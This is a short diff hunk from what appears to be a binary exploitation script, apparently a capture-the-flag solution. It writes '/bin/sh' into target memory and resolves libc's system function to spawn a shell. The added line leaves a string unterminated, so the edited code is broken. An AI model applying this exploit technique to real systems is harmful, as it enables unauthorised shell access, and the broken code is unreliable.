@@ -128,7 +128,7 @@ def main():
     for i in range(len(write)):
         point(0, (-0x13c0+i), write[i])
     reset(1, 1)
-    sh = ['/', 'b', 'i', 'n', '/', 's', 'h', '\00']
+    sh = "/bin/sh\00
     for i in range(len(sh)):
         point(0, i, ord(sh[i])) 
     system = libc.sym.system
